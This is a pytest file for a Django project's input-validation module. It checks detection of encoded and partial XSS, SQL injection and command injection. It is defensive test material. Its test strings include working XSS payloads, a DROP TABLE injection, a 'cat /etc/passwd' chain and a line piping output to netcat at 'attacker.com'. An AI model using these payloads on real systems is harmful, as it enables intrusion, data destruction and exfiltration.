"""
Tests for Enhanced Input Validators

Tests comprehensive validation including:
- Encoded XSS attacks (HTML entities, URL encoding, Unicode)
- Partial tag attacks
- Obfuscated SQL injection
- All attack vectors from the plan
"""

import pytest
from django.core.exceptions import ValidationError
from common.validators import (
    normalize_for_detection,
    contains_xss,
    contains_sql_injection,
    contains_command_injection,
    contains_partial_tags,
    validate_input,
)


class TestNormalization:
    """Test input normalization"""
    
    def test_html_entity_decoding(self):
        """Test HTML entity decoding"""
        value = "&lt;script&gt;alert(1)&lt;/script&gt;"
        normalized = normalize_for_detection(value)
        assert "<script>" in normalized
    
    def test_url_encoding_decoding(self):
        """Test URL encoding decoding"""
        value = "%3Cscript%3Ealert(1)%3C/script%3E"
        normalized = normalize_for_detection(value)
        assert "<script>" in normalized
    
    def test_unicode_decoding(self):
        """Test Unicode escape decoding"""
        value = "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
        normalized = normalize_for_detection(value)
        assert "script" in normalized
    
    def test_multiple_encoding_layers(self):
        """Test multiple layers of encoding"""
        value = "%26lt%3Bscript%26gt%3B"  # Double encoded
        normalized = normalize_for_detection(value)
        assert "script" in normalized


class TestXSSDetection:
    """Test XSS attack detection"""
    
    def test_basic_script_tag(self):
        assert contains_xss("<script>alert(1)</script>")
    
    def test_uppercase_script(self):
        assert contains_xss("<SCRIPT>alert(1)</SCRIPT>")
    
    def test_mixed_case_script(self):
        assert contains_xss("<ScRiPt>alert(1)</ScRiPt>")
    
    def test_partial_script_tag(self):
        """Test partial tags like <scrip"""
        assert contains_partial_tags("<scrip")
        assert contains_partial_tags("<scri")
        assert contains_partial_tags("<scr")
        assert contains_partial_tags("<sc")
        assert contains_xss("<scrip")
    
    def test_html_entity_encoded(self):
        assert contains_xss("&lt;script&gt;alert(1)&lt;/script&gt;")
    
    def test_url_encoded(self):
        assert contains_xss("%3Cscript%3Ealert(1)%3C/script%3E")
    
    def test_event_handlers(self):
        assert contains_xss('<img src=x onerror=alert(1)>')
        assert contains_xss('<div onclick=alert(1)>')
        assert contains_xss('<body onload=alert(1)>')
    
    def test_javascript_protocol(self):
        assert contains_xss('javascript:alert(1)')
        assert contains_xss('JAVASCRIPT:alert(1)')
    
    def test_data_uri(self):
        assert contains_xss('data:text/html,<script>alert(1)</script>')
    
    def test_svg_xss(self):
        assert contains_xss('<svg/onload=alert(1)>')
    
    def test_iframe_xss(self):
        assert contains_xss('<iframe src="javascript:alert(1)">')
        assert contains_xss('<ifram')  # Partial
    
    def test_style_injection(self):
        assert contains_xss('<style>@import"javascript:alert(1)"</style>')
    
    def test_obfuscated_patterns(self):
        """Test obfuscated XSS from user's report"""
        assert contains_xss("<script>alert,<scrip,xxs),(xxs),(xxs")
    
    def test_safe_input(self):
        """Test that safe input passes"""
        assert not contains_xss("Hello World")
        assert not contains_xss("user@example.com")
        assert not contains_xss("Normal text with numbers 123")


class TestSQLInjection:
    """Test SQL injection detection"""
    
    def test_or_1_equals_1(self):
        assert contains_sql_injection("' OR '1'='1")
        assert contains_sql_injection("' OR 1=1--")
    
    def test_union_select(self):
        assert contains_sql_injection("' UNION SELECT * FROM users--")
    
    def test_drop_table(self):
        assert contains_sql_injection("'; DROP TABLE users--")
    
    def test_sql_comments(self):
        assert contains_sql_injection("admin'--")
        assert contains_sql_injection("admin'#")
    
    def test_hex_encoding(self):
        assert contains_sql_injection("0x61646D696E")
    
    def test_safe_input(self):
        assert not contains_sql_injection("normal@email.com")
        assert not contains_sql_injection("John Doe")


class TestCommandInjection:
    """Test command injection detection"""
    
    def test_semicolon_chaining(self):
        assert contains_command_injection("test; cat /etc/passwd")
    
    def test_pipe_redirect(self):
        assert contains_command_injection("test | nc attacker.com 1234")
    
    def test_path_traversal(self):
        assert contains_command_injection("../../etc/passwd")
    
    def test_safe_input(self):
        assert not contains_command_injection("normal file.txt")


class TestValidateInput:
    """Test comprehensive input validation"""
    
    def test_xss_rejected(self):
        with pytest.raises(ValidationError) as exc_info:
            validate_input("<script>alert(1)</script>", "username", strict_mode=True)
        assert "XSS" in str(exc_info.value)
    
    def test_sql_injection_rejected(self):
        with pytest.raises(ValidationError) as exc_info:
            validate_input("' OR '1'='1", "username", strict_mode=True)
        assert "SQL" in str(exc_info.value)
    
    def test_encoded_xss_rejected(self):
        """Test that encoded XSS is also rejected"""
        with pytest.raises(ValidationError):
            validate_input("&lt;script&gt;", "comment", strict_mode=True)
    
    def test_partial_tag_rejected(self):
        """Test that partial tags are rejected"""
        with pytest.raises(ValidationError):
            validate_input("<scrip", "comment", strict_mode=True)
    
    def test_length_validation(self):
        with pytest.raises(ValidationError) as exc_info:
            validate_input("a" * 300, "field", max_length=255, strict_mode=True)
        assert "maximum length" in str(exc_info.value)
    
    def test_safe_input_passes(self):
        result = validate_input("John Doe", "name", strict_mode=True)
        assert result == "John Doe"
